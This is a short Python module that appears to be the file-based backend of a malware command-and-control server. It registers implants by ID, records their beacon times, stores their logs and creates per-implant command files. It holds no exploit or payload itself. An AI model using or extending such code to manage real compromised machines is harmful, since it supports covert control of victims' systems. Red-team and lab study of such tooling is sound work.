import json
import os

def add_malware(malware_entry):

    directory = f"malware/{malware_entry["id"]}"

    entry = json.dumps(malware_entry)
    

    os.makedirs("malware", exist_ok="true")

    os.makedirs(directory, exist_ok="true")

    with open(f"{directory}/about.txt", "w") as f:
        f.write(entry + "\n")

    open(f"{directory}/logs.txt", "x")

    open (f"{directory}/commands.txt", "x")

def update_becon_malware(id, timestamp):

    malware_json = json.loads(read_file(id,"about.txt"))

    malware_json["last_beconed"] = timestamp

    data = json.dumps(malware_json)

    write_file(id, "about.txt", data)

def add_log_malware(data):

    id = data['id']
    log =  data['log']

    append_file(id,"logs.txt",log)


def read_file(id, file):

    file_name = f"malware/{id}/{file}"

    with open(file_name, "r") as f:
        return f.read()
    
def append_file(id, file, data):

    file_name = f"malware/{id}/{file}"

    with open(file_name, "a") as f:
        f.write(data+"\n")

def write_file(id, file, data):

    file_name = f"malware/{id}/{file}"

    with open(file_name, "w") as f:
        f.write(data)
